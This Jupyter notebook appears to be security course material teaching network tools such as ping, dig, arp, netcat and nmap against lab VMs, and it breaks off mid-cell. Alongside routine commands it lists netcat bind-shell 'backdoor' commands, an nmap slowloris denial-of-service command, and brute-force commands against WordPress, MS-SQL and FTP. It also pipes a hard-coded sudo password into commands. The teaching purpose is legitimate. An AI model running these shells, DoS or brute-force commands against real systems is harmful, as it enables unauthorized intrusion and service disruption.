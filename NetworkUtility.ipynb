{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Network Utility Tools \n",
    "- Tools used for network management, routing, scanning and discovery, etc.\n",
    "    - ping\n",
    "    - host\n",
    "    - dig\n",
    "    - route\n",
    "    - dhclient\n",
    "    - arp\n",
    "    - netcat\n",
    "    - nmap\n",
    "    \n",
    "## Note: start with ! to run bash commands\n",
    "\n",
    "## Install net-tools for many network utilities"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | sudo -S apt install net-tools"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ping - test if a system is up\n",
    "\n",
    "- check if there's a connectivity between the hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PING google.com (172.217.1.206) 56(84) bytes of data.\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=1 ttl=128 time=25.1 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=2 ttl=128 time=17.2 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=3 ttl=128 time=17.5 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=4 ttl=128 time=12.2 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=5 ttl=128 time=11.6 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=6 ttl=128 time=17.3 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=7 ttl=128 time=18.5 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=8 ttl=128 time=29.6 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=9 ttl=128 time=18.0 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=10 ttl=128 time=10.5 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=11 ttl=128 time=15.8 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=12 ttl=128 time=16.9 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=13 ttl=128 time=10.4 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=14 ttl=128 time=16.6 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=15 ttl=128 time=16.0 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=16 ttl=128 time=10.4 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=17 ttl=128 time=19.2 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=18 ttl=128 time=13.2 ms\n",
      "^C\n",
      "\n",
      "--- google.com ping statistics ---\n",
      "18 packets transmitted, 18 received, 0% packet loss, time 17028ms\n",
      "rtt min/avg/max/mdev = 10.404/16.444/29.615/4.858 ms\n"
     ]
    }
   ],
   "source": [
    "! ping google.com"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## DNS Lookup Commands\n",
    "\n",
    "- host and dig are two utility commands that can lookup DNS"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HOST(1)                             BIND 9                             HOST(1)\r\n",
      "\r\n",
      "N\bNA\bAM\bME\bE\r\n",
      "       host - DNS lookup utility\r\n",
      "\r\n",
      "S\bSY\bYN\bNO\bOP\bPS\bSI\bIS\bS\r\n",
      "       h\bho\bos\bst\bt  [-\b-a\baA\bAC\bCd\bdl\bln\bnr\brs\bsT\bTU\bUw\bwv\bv]  [-\b-c\bc  class] [-\b-N\bN ndots] [-\b-p\bp port] [-\b-R\bR number] [-\b-t\bt\r\n",
      "       type] [-\b-W\bW wait] [-\b-m\bm flag] [ [-\b-4\b4] | [-\b-6\b6] ] [-\b-v\bv] [-\b-V\bV] {name} [server]\r\n",
      "\r\n",
      "D\bDE\bES\bSC\bCR\bRI\bIP\bPT\bTI\bIO\bON\bN\r\n",
      "       h\bho\bos\bst\bt is a simple utility for performing DNS  lookups.  It  is  normally\r\n",
      "       used to convert names to IP addresses and vice versa. When no arguments\r\n",
      "       or options are given, h\bho\bos\bst\bt prints a short summary of its  command  line\r\n",
      "       arguments and options.\r\n",
      "\r\n",
      "       n\bna\bam\bme\be  is the domain name that is to be looked up. It can also be a dot‐\r\n",
      "       ted-decimal IPv4 address or a colon-delimited IPv6  address,  in  which\r\n",
      "       case  h\bho\bos\bst\bt  will  by default perform a reverse lookup for that address.\r\n",
      "       s\bse\ber\brv\bve\ber\br is an optional argument which is either the name or  IP  address\r\n",
      "       of  the  name  server  that  h\bho\bos\bst\bt should query instead of the server or\r\n",
      "       servers listed in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "O\bOP\bPT\bTI\bIO\bON\bNS\bS\r\n",
      "       -\b-4\b4     Use IPv4 only for query transport. See also the -\b-6\b6 option.\r\n",
      "\r\n",
      "       -\b-6\b6     Use IPv6 only for query transport. See also the -\b-4\b4 option.\r\n",
      "\r\n",
      "       -\b-a\ba     \"All\". The -\b-a\ba option is normally equivalent to  -\b-v\bv  -\b-t\bt  A\bAN\bNY\bY.  It\r\n",
      "              also affects the behaviour of the -\b-l\bl list zone option.\r\n",
      "\r\n",
      "       -\b-A\bA     \"Almost  all\".  The  -\b-A\bA option is equivalent to -\b-a\ba except RRSIG,\r\n",
      "              NSEC, and NSEC3 records are omitted from the output.\r\n",
      "\r\n",
      "       -\b-c\bc class\r\n",
      "              Query class: This can be  used  to  lookup  HS  (Hesiod)  or  CH\r\n",
      "              (Chaosnet)  class resource records. The default class is IN (In‐\r\n",
      "              ternet).\r\n",
      "\r\n",
      "       -\b-C\bC     Check consistency: h\bho\bos\bst\bt will query the SOA records for zone n\bna\bam\bme\be\r\n",
      "              from  all  the  listed authoritative name servers for that zone.\r\n",
      "              The list of name servers is defined by the NS records  that  are\r\n",
      "              found for the zone.\r\n",
      "\r\n",
      "       -\b-d\bd     Print debugging traces. Equivalent to the -\b-v\bv verbose option.\r\n",
      "\r\n",
      "       -\b-l\bl     List  zone:  The  h\bho\bos\bst\bt  command performs a zone transfer of zone\r\n",
      "              n\bna\bam\bme\be and prints out the NS, PTR and address records (A/AAAA).\r\n",
      "\r\n",
      "              Together, the -\b-l\bl -\b-a\ba options print all records in the zone.\r\n",
      "\r\n",
      "       -\b-N\bN ndots\r\n",
      "              The number of dots that have to be in n\bna\bam\bme\be for it to be  consid‐\r\n",
      "              ered absolute. The default value is that defined using the ndots\r\n",
      "              statement in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf, or 1 if  no  ndots  statement  is\r\n",
      "              present. Names with fewer dots are interpreted as relative names\r\n",
      "              and will be searched for in the domains listed in the s\bse\bea\bar\brc\bch\bh  or\r\n",
      "              d\bdo\bom\bma\bai\bin\bn directive in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "       -\b-p\bp port\r\n",
      "              Specify the port on the server to query. The default is 53.\r\n",
      "\r\n",
      "       -\b-r\br     Non-recursive  query:  Setting this option clears the RD (recur‐\r\n",
      "              sion desired) bit in the query. This should mean that  the  name\r\n",
      "              server receiving the query will not attempt to resolve n\bna\bam\bme\be. The\r\n",
      "              -\b-r\br option enables h\bho\bos\bst\bt to mimic the behavior of a name server by\r\n",
      "              making non-recursive queries and expecting to receive answers to\r\n",
      "              those queries that can be referrals to other name servers.\r\n",
      "\r\n",
      "       -\b-R\bR number\r\n",
      "              Number of retries for UDP queries:  If  n\bnu\bum\bmb\bbe\ber\br  is  negative  or\r\n",
      "              zero, the number of retries will default to 1. The default value\r\n",
      "              is 1, or the value of the a\bat\btt\bte\bem\bmp\bpt\bts\bs option  in  /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf,\r\n",
      "              if set.\r\n",
      "\r\n",
      "       -\b-s\bs     Do  _\bn_\bo_\bt  send the query to the next nameserver if any server re‐\r\n",
      "              sponds with a SERVFAIL response, which is the reverse of  normal\r\n",
      "              stub resolver behavior.\r\n",
      "\r\n",
      "       -\b-t\bt type\r\n",
      "              Query  type: The t\bty\byp\bpe\be argument can be any recognized query type:\r\n",
      "              CNAME, NS, SOA, TXT, DNSKEY, AXFR, etc.\r\n",
      "\r\n",
      "              When no query type is specified, h\bho\bos\bst\bt automatically  selects  an\r\n",
      "              appropriate query type. By default, it looks for A, AAAA, and MX\r\n",
      "              records. If the -\b-C\bC option is given, queries will be made for SOA\r\n",
      "              records.  If  n\bna\bam\bme\be is a dotted-decimal IPv4 address or colon-de‐\r\n",
      "              limited IPv6 address, h\bho\bos\bst\bt will query for PTR records.\r\n",
      "\r\n",
      "              If a query type of IXFR is chosen the starting serial number can\r\n",
      "              be  specified by appending an equal followed by the starting se‐\r\n",
      "              rial number (like -\b-t\bt I\bIX\bXF\bFR\bR=\b=1\b12\b23\b34\b45\b56\b67\b78\b8).\r\n",
      "\r\n",
      "       -\b-T\bT; -\b-U\bU TCP/UDP: By default, h\bho\bos\bst\bt uses UDP when making queries.  The  -\b-T\bT\r\n",
      "              option  makes  it  use  a  TCP connection when querying the name\r\n",
      "              server. TCP will be automatically selected for queries that  re‐\r\n",
      "              quire  it,  such  as  zone  transfer  (AXFR)  requests. Type ANY\r\n",
      "              queries default to TCP but can be forced to UDP initially  using\r\n",
      "              -\b-U\bU.\r\n",
      "\r\n",
      "       -\b-m\bm flag\r\n",
      "              Memory usage debugging: the flag can be r\bre\bec\bco\bor\brd\bd, u\bus\bsa\bag\bge\be, or t\btr\bra\bac\bce\be.\r\n",
      "              You can specify the -\b-m\bm option more than  once  to  set  multiple\r\n",
      "              flags.\r\n",
      "\r\n",
      "       -\b-v\bv     Verbose  output. Equivalent to the -\b-d\bd debug option. Verbose out‐\r\n",
      "              put can also be enabled by setting the d\bde\beb\bbu\bug\bg option in  /\b/e\bet\btc\bc/\b/r\bre\be‐\b‐\r\n",
      "              s\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "       -\b-V\bV     Print the version number and exit.\r\n",
      "\r\n",
      "       -\b-w\bw     Wait  forever: The query timeout is set to the maximum possible.\r\n",
      "              See also the -\b-W\bW option.\r\n",
      "\r\n",
      "       -\b-W\bW wait\r\n",
      "              Timeout: Wait for up to w\bwa\bai\bit\bt seconds for a  reply.  If  w\bwa\bai\bit\bt  is\r\n",
      "              less than one, the wait interval is set to one second.\r\n",
      "\r\n",
      "              By  default,  h\bho\bos\bst\bt will wait for 5 seconds for UDP responses and\r\n",
      "              10 seconds for TCP connections. These defaults can be overridden\r\n",
      "              by the t\bti\bim\bme\beo\bou\but\bt option in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "              See also the -\b-w\bw option.\r\n",
      "\r\n",
      "I\bID\bDN\bN S\bSU\bUP\bPP\bPO\bOR\bRT\bT\r\n",
      "       If  h\bho\bos\bst\bt  has  been built with IDN (internationalized domain name) sup‐\r\n",
      "       port, it can accept and display non-ASCII domain names. h\bho\bos\bst\bt  appropri‐\r\n",
      "       ately  converts  character encoding of domain name before sending a re‐\r\n",
      "       quest to DNS server or displaying a reply from  the  server.  If  you'd\r\n",
      "       like  to  turn off the IDN support for some reason, define the IDN_DIS‐\r\n",
      "       ABLE environment variable. The IDN support is disabled if the  variable\r\n",
      "       is set when h\bho\bos\bst\bt runs.\r\n",
      "\r\n",
      "F\bFI\bIL\bLE\bES\bS\r\n",
      "       /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf\r\n",
      "\r\n",
      "S\bSE\bEE\bE A\bAL\bLS\bSO\bO\r\n",
      "       d\bdi\big\bg(\b(1\b1)\b), n\bna\bam\bme\bed\bd(\b(8\b8)\b).\r\n",
      "\r\n",
      "A\bAU\bUT\bTH\bHO\bOR\bR\r\n",
      "       Internet Systems Consortium\r\n",
      "\r\n",
      "C\bCO\bOP\bPY\bYR\bRI\bIG\bGH\bHT\bT\r\n",
      "       2020, Internet Systems Consortium\r\n",
      "\r\n",
      "9.16.4-Debian                     2020-06-10                           HOST(1)\r\n"
     ]
    }
   ],
   "source": [
    "! man host"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "google.com has address 172.217.1.206\r\n",
      "google.com has IPv6 address 2607:f8b0:4009:815::200e\r\n",
      "google.com mail is handled by 10 aspmx.l.google.com.\r\n",
      "google.com mail is handled by 30 alt2.aspmx.l.google.com.\r\n",
      "google.com mail is handled by 50 alt4.aspmx.l.google.com.\r\n",
      "google.com mail is handled by 20 alt1.aspmx.l.google.com.\r\n",
      "google.com mail is handled by 40 alt3.aspmx.l.google.com.\r\n"
     ]
    }
   ],
   "source": [
    "! host google.com"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying \"google.com\"\r\n",
      ";; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62123\r\n",
      ";; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0\r\n",
      "\r\n",
      ";; QUESTION SECTION:\r\n",
      ";google.com.\t\t\tIN\tANY\r\n",
      "\r\n",
      ";; ANSWER SECTION:\r\n",
      "google.com.\t\t5\tIN\tA\t172.217.1.206\r\n",
      "google.com.\t\t5\tIN\tMX\t10 aspmx.l.google.com.\r\n",
      "google.com.\t\t5\tIN\tMX\t30 alt2.aspmx.l.google.com.\r\n",
      "google.com.\t\t5\tIN\tMX\t50 alt4.aspmx.l.google.com.\r\n",
      "google.com.\t\t5\tIN\tMX\t20 alt1.aspmx.l.google.com.\r\n",
      "google.com.\t\t5\tIN\tMX\t40 alt3.aspmx.l.google.com.\r\n",
      "\r\n",
      "Received 152 bytes from 192.168.195.2#53 in 4 ms\r\n"
     ]
    }
   ],
   "source": [
    "! host -a google.com # display all records"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "coloradomesa.edu has address 10.0.3.167\r\n"
     ]
    }
   ],
   "source": [
    "# -t: query type; a\n",
    "! host -t a coloradomesa.edu # domain ip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! host -t mx coloradomesa.edu # domain mail server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! host -t ns coloradomesa.edu # nameserver"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## reverse lookup\n",
    "- given IP, find the domain name"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! host 72.166.224.167"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# dig is another tool\n",
    "! man dig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! dig google.com"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "## Display arp/routing cache"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! man route"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# route is priviledge command\n",
    "! echo kali | sudo -S route -n # show numerical addresses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | sudo -S ifconfig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ping 192.168.195.2\n",
    "# will not stop; so click Kernel -> Interrept to send Ctrl+C to the Terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## dhclient\n",
    " - Dynamic Host Configuration Prototocol Client\n",
    " - used to configure network interfaces with DHCP\n",
    "     - IP addresses are assigned dynamically\n",
    "     - if fails, IP can be assigned statically"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! man dhclient"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | sudo -S dhclient -v -r"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Internal routing table\n",
    "- typically displays gateway information that could be very useful to know how the packet is being routed to the internet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! sudo kali | sudo -S dhclient"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! route -n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ifconfig"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ARP - address resolution protocol \n",
    "- maps private IP to ethernet/MAC address for local/internal routing\n",
    "- without knowing each other's MAC address, systems cann't communicate each other\n",
    "- there are 4 different types of ARP messages, but ARP request and ARP reply message are most important and common types"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! man arp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! arp -n # -n shows numerical addresses from ARP cache"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Find ip of host or another VM or gateway and ping it to see the ARP cache being changed\n",
    "- $ ifconfig | grep inet \n",
    "- and ping host and then run route -n again to see the routing table"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ping -c 1 -w 1 192.168.231.100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ping -c 1 192.168.231.155"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! arp -n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# arp -d <ip> to delete entry\n",
    "! arp -d 192.168.1.110"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! arp -n #shows (incomplete) completely clearing is not easy"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### flush all entries"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ip -s -s neigh flush all"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Netcat\n",
    "- utility tool that supports a wide range of commands to manage networks and send and receive data between systems\n",
    "- more info: https://www.varonis.com/blog/netcat-commands/\n",
    "- netcat or nc are the commands used with many options"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nc -h"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Port scanning with Netcat\n",
    "- netcat can be used scan a host(domain or ip) to diagnose a network issues or performance problem\n",
    "- can determine whether a firewall is blocking traffic\n",
    "- no success!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ifconfig | grep inet"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "! ping -c 1 google.com"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# scan port from 1-1000; doesn't seem to do much\n",
    "! nc -z -v google.com 1-1000"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check single port\n",
    "! nc -z -v google.com 443"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Sending data over network\n",
    "- netcat can connect to udp and tcp service and send"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# download index page from washing.edu and save it to file\n",
    "# send HTTP GET request\n",
    "! printf \"GET / HTTP/1.1\\r\\n\\r\\n\" | nc washington.edu 80 > washington.html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create a local Web server\n",
    "- run the following command from "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nc -l -p 8080\n",
    "# open a browser and go to localhost:8080"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! printf \"HTTP/1.1 200 OK \\n\\n <h1>Welcome...<h1>\" | netcat -l -p 8080\n",
    "# open browswer and point it to: localhost:8080"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Netcat File Transfer\n",
    "\n",
    "### server\n",
    "$ nc -l [port] > file_name.in # receive a file\n",
    "\n",
    "### client\n",
    "$ nc [host] [port] < file_name.out # send a file\n",
    "\n",
    "\n",
    "### Grab banner"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo \"\" | nc -vv -z -w1 google.com 443"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Netcat Backdoor Shells\n",
    "\n",
    "nc -l -p [port] -e /bin/bash # run a shell on Linux\n",
    "\n",
    "nc -l -p [port] -e cmd.exe # run a shell on Netcat for Windows\n",
    "\n",
    "## Network scaning and mapping\n",
    "- nmap is the most popular tool for this - https://nmap.org/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap --help"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -v -A scanme.nmap.org"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scanning unauthorized system and network is illegal!\n",
    "\n",
    "### Scan SEED Lab VM\n",
    "- find IP address of the VM\n",
    "- detect OS and services"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -A 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Nmap Common Commands\n",
    "- https://securitytrails.com/blog/top-15-nmap-commands-to-scan-remote-hosts\n",
    "\n",
    "### Basic Namp Scan against IP or host\n",
    "- perfect first step quick scanning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap 192.168.195.131"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap scanme.nmap.org"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan specific ports\n",
    "- nmap can scan all 65535 possible ports\n",
    "- you can limit to specific ports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -p 1-65535 localhost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# scan SEEDLab VM\n",
    "! nmap -p 22,80,443 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan multiple IP addresses\n",
    "- nmap ip1 ip2\n",
    "- nmap 1.1.1.1,2,3,4 # consecutive ip addresses\n",
    "\n",
    "### Scan IP ranges\n",
    "- Classless Inter-Domain Routing (CIDR) notation: https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing\n",
    "    - See IPv4 CIDR blocsk section for quick reference\n",
    "- nmap 192.168.195.0/24 # Scan $2^8=256$ hosts in 195 subnet; class C\n",
    "- nmap 192.168.195.* # scan all 256 hosts from .1 to .256; class\n",
    "- nmap 192.168.195.10-100 # scan host from .10 to .100\n",
    "- nmap 192.168.195.* --exclude 192.168.195.1\n",
    "\n",
    "### Scan the most popular ports\n",
    "- scan top N most popular ports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap --top-ports 10 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan hosts and IP addresses reading from a text file\n",
    "- create a text file (hosts.txt) with ip address and host names one per line"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! printf \"192.168.195.131\\nscanme.nmap.org\" > hosts.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat hosts.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -iL hosts.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Save scan results to a file\n",
    "- oN - normal format\n",
    "- oX - xml format"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -oN nmapResults.txt localhost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat nmapResults.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -oX nmapResults.xml localhost"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat nmapResults.xml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan + OS and service detection with fast execution\n",
    "- T4 - for faster execution"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -A -T4 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Detect Service/daemon version\n",
    "- -sV parameter does it!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -sV 192.168.195.131"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Scan TCP or UDP based services\n",
    "- -sT - scan TCP-based services (most services use TCP)\n",
    "- sU - scan UDP-based services"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap --top-ports 10 -sU 192.168.195.131\n",
    "# a little slower"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CVE detection using Nmap\n",
    "- Nmap supports Nmap Scripting Engine (NSE)\n",
    "- Nmap can be scripted using Lua programming language\n",
    "- can use pre-defined scripts or write your own\n",
    "\n",
    "- run a full vulnerability scan on a target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap -Pn --script vuln 192.168.195.131\n",
    "# takes a while!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Denial of Service (DOS) attack with Nmap\n",
    "nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true\n",
    "\n",
    "### Launching brute force attacks\n",
    "\n",
    "### WordPress brute force attack\n",
    "nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' [target]\n",
    "\n",
    "### MS-SQL Brute force attack\n",
    "nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt [target]\n",
    "\n",
    "### FTP Brute force attack\n",
    "nmap --script ftp-brute -p 21 [target]\n",
    "\n",
    "SEED Lab has FTP port 21 open and an accout with user:user; let's brute force it!\n",
    "- doesn't find seed:dees - interesting!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nmap --script ftp-brute -p 21 192.168.195.131\n",
    "# may take a while!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Detecting malware infection on remote hosts\n",
    "- nmap may detect malware and backdoors by running extensive tests on popular OS services like:\n",
    "    - IDENTD, Proftpd, Vsftpd, IRC, SMB, and SMTP\n",
